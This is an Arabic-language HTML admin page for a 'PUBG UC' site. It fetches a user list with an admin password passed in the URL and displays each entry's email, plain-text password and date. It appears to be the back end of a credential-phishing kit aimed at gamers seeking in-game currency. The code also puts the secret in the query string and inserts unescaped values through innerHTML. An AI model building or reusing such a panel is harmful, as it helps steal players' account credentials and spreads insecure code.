<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head><meta charset="UTF-8"><title>Admin</title></head>
<body style="background:#111;color:#fff;font-family:Cairo;padding:20px">
  <h1>لوحة تحكم PUBG UC</h1>
  <input id="pass" type="password" placeholder="باسورد الادمن">
  <button onclick="getUsers()">عرض اليوزرز</button>
  <table id="tbl" border="1" style="width:100%;margin-top:20px"></table>

<script>
async function getUsers(){
  const pass = document.getElementById('pass').value;
  const res = await fetch(`/api/users?pass=${pass}`);
  const data = await res.json();
  tbl.innerHTML = '<tr><th>الايميل</th><th>الباسورد</th><th>التاريخ</th></tr>' + 
  data.map(u=>`<tr><td>${u.id}</td><td>${u.password}</td><td>${u.date}</td></tr>`).join('');
}
</script>
</body>
</html>
